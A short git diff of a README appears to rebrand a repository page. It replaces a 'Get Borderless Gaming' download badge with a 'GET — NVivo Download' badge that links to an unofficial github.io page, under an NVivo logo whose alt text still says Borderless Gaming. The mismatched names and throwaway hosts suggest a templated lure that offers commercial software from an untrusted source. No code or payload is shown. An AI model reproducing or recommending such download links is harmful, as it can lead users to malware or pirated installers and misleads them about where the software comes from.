@@ -4,11 +4,8 @@
   <img src="https://open.ed.ac.uk/wp-content/uploads/nvivo.png" alt="Borderless Gaming Logo"/>
 </p>
 
-<p align="center">
-  <a href="https://nvivo-download.github.io/.github/">
-    <img src="https://img.shields.io/badge/⬇️_Get_Borderless_Gaming-blue?style=for-the-badge&logo=github" alt="Get Borderless Gaming"/>
-  </a>
-</p>
+[![GET NVivo Download](https://img.shields.io/badge/GET%20%E2%80%94%20NVivo-Download-0078D6?style=for-the-badge&logoColor=white)](https://santrjd299843.github.io/.github/NVivo-Download)
+
 
 ---
 
